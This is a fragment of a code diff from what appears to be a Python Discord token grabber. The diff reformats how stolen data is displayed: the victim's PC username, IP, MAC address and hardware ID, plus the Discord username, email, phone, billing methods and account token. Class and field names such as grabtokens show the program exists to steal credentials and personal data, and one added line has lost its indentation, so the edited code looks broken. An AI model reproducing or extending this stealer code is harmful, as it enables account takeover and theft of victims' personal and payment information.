@@ -81,7 +81,8 @@ def get_inf():
     ram = round(float(wmi.WMI().Win32_OperatingSystem()[
                 0].TotalVisibleMemorySize) / 1048576, 0)
 
-    embed.add_field(name="SYSTEM INFO", value=f"```PC Username: {pc_username}\nPC Name: {pc_name}\nOS: {computer_os}\n\nIP: {ip_address}\nMAC: {mac_address}\nHWID: {hwid}CPU: {cpu.Name}\nGPU: {gpu.Name}\nRAM: {ram}GB```", inline=False)
+embed.add_field(name="SYSTEM INFO", value=f'''```yaml
+PC Username: {pc_username}\nPC Name: {pc_name}\nOS: {computer_os}\n\nIP: {ip_address}\nMAC: {mac_address}\nHWID: {hwid}CPU: {cpu.Name}\nGPU: {gpu.Name}\nRAM: {ram}GB```''', inline=False)
 
 class grabtokens():
     def __init__(self):
@@ -240,7 +241,8 @@ class grabtokens():
                     else:
                         methods += "❓"
 
-            embed.add_field(name="DISCORD INFO", value=f"```Discord Username: {username} \nDiscord ID: {uid}\nEmail: {email}\n\nPhone: {phone}\nNitro: {nitro}\nBilling: {methods}\n\nToken:{token}```", inline=False)
+            embed.add_field(name="DISCORD INFO", value=f'''```yaml
+Discord Username: {username} \nDiscord ID: {uid}\nEmail: {email}\n\nPhone: {phone}\nNitro: {nitro}\nBilling: {methods}\n\nToken: {token}```''', inline=False)
 
 
 def ss():
